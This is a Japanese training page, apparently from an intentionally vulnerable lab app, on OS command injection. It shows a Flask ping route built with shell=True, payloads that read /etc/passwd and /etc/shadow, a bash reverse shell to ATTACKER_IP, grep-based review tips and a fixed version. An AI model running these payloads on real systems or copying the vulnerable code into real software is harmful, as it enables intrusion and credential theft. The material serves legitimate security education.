# 6. OSコマンドインジェクション

## 概要
ユーザーの入力値がOSコマンドの引数として直接渡され、シェルメタ文字を使って任意のコマンドが実行できる脆弱性。

## 参考
- IPA「安全なウェブサイトの作り方」: 1.2 OSコマンド・インジェクション
- OWASP Top 10 2021: A03:2021 – Injection
- CWE-78: OS Command Injection

## 脆弱なコード

```python
@app.route('/vuln/cmdi', methods=['GET', 'POST'])
def vuln_cmdi():
    host = request.form.get('host', '')
    # shell=True + ユーザー入力をそのまま埋め込み（脆弱）
    result = subprocess.run(
        f'ping -c 3 {host}',
        shell=True,
        capture_output=True,
        text=True,
        timeout=10,
    )
```

## 攻撃手順とペイロード例

### セミコロンによるコマンド連結
```
127.0.0.1; whoami
127.0.0.1; cat /etc/passwd
127.0.0.1; ls -la /app
```

### パイプによるコマンド実行
```
127.0.0.1 | id
127.0.0.1 | env
```

### AND演算子
```
127.0.0.1 && cat /etc/shadow
```

### バッククォート
```
127.0.0.1; echo `hostname`
```

### リバースシェル（教育目的のみ）
```
127.0.0.1; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

## ホワイトボックス診断の着眼点

### このアプリで見るべき箇所
| ファイル | 行 | 注目ポイント |
|---------|-----|------------|
| `app/app.py` | 201-207 | `subprocess.run(f'ping -c 3 {host}', shell=True, ...)` — `shell=True` + f-string |
| `app/app.py` | 198 | `host = request.form.get('host', '')` — ユーザー入力を未検証で使用 |
| `app/app.py` | 202 | `f'ping -c 3 {host}'` — コマンド文字列にユーザー入力をそのまま埋め込み |

### コードレビューで探すパターン（grep対象）
```bash
# subprocess の使用箇所（特に shell=True）
grep -rn 'subprocess' app/
grep -rn 'shell=True' app/

# os.system() / os.popen() の使用
grep -rn 'os\.system\|os\.popen' app/

# コマンド実行に関連する他の関数
grep -rn 'Popen\|call(\|check_output\|check_call' app/

# eval() / exec() の使用（Pythonコードインジェクション）
grep -rn 'eval(\|exec(' app/

# ユーザー入力がコマンドに渡される流れ
grep -rn 'request.*form\|request.*args' app/app.py | grep -i 'host\|cmd\|command\|ip\|addr'
```

### 診断の勘所
1. **`shell=True` の全数検査**: `subprocess` のすべての呼び出しで `shell=True` を使っていないか確認。これが最大のリスク要因
2. **コマンド文字列の組み立て方**: f-string / `.format()` / `%` / `+` でユーザー入力をコマンドに埋め込んでいないか
3. **入力バリデーション**: ユーザー入力をコマンドに渡す前に、ホワイトリスト検証（IPアドレス形式など）を行っているか
4. **代替手段の有無**: OSコマンド実行ではなくPythonライブラリで実現できないか（例: `ping` → `socket` / `icmplib`）
5. **タイムアウト設定**: `timeout` が設定されていても、それまでに悪意あるコマンドは十分実行可能であることに注意
6. **`eval()` / `exec()`**: Pythonレベルのコードインジェクションも同時にチェック

## 対策（修正コード + セキュリティ原則）

### 修正方法: shell=False + 入力値検証
```python
import ipaddress

@app.route('/vuln/cmdi', methods=['GET', 'POST'])
def vuln_cmdi():
    host = request.form.get('host', '')
    # IPアドレス形式のバリデーション
    try:
        ipaddress.ip_address(host)
    except ValueError:
        return 'Invalid IP address', 400

    # shell=False でリスト形式で渡す（安全）
    result = subprocess.run(
        ['ping', '-c', '3', host],
        capture_output=True,
        text=True,
        timeout=10,
    )
```

### セキュリティ原則
- **shell=False**: シェルを経由せず、コマンドをリスト形式で渡す
- **入力値検証**: ホワイトリスト方式で許可する形式を制限する
- **最小権限**: アプリケーションの実行ユーザーの権限を最小化する
- **OSコマンド実行の回避**: 可能であれば外部コマンドではなくライブラリを使用する
